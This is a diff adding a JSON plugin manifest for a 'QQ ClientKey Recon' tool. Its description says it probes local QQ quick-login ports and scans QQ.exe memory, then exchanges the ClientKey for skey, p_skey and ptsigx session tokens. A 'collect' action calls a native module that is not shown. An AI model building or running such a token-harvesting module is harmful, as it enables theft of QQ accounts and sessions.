@@ -1,0 +1,33 @@
+{
+  "schemaVersion": 1,
+  "pluginId": "com.libra.qqkey",
+  "name": "QQ ClientKey 探测",
+  "version": "1.0.0",
+  "author": "libra",
+  "description": "探测本机 QQ 快速登录端口（4300-4310）+ QQ.exe 进程内存扫描，经 ptlogin2 jump 兑换 skey/p_skey/bkn/ptsigx。",
+  "entry": {
+    "route": "qqkey",
+    "label": "nav.qqkey",
+    "icon": "Bug",
+    "apiRoot": "/api/plugins/com.libra.qqkey"
+  },
+  "i18n": {
+    "zh": { "nav.qqkey": "QQ ClientKey 探测" },
+    "en": { "nav.qqkey": "QQ ClientKey Recon" }
+  },
+  "actions": [
+    {
+      "action": "collect",
+      "label": "采集 QQ ClientKey",
+      "method": "POST",
+      "argsSchema": {
+        "type": "object",
+        "properties": {}
+      },
+      "module": {
+        "kind": "native",
+        "name": "qqkey"
+      }
+    }
+  ]
+}
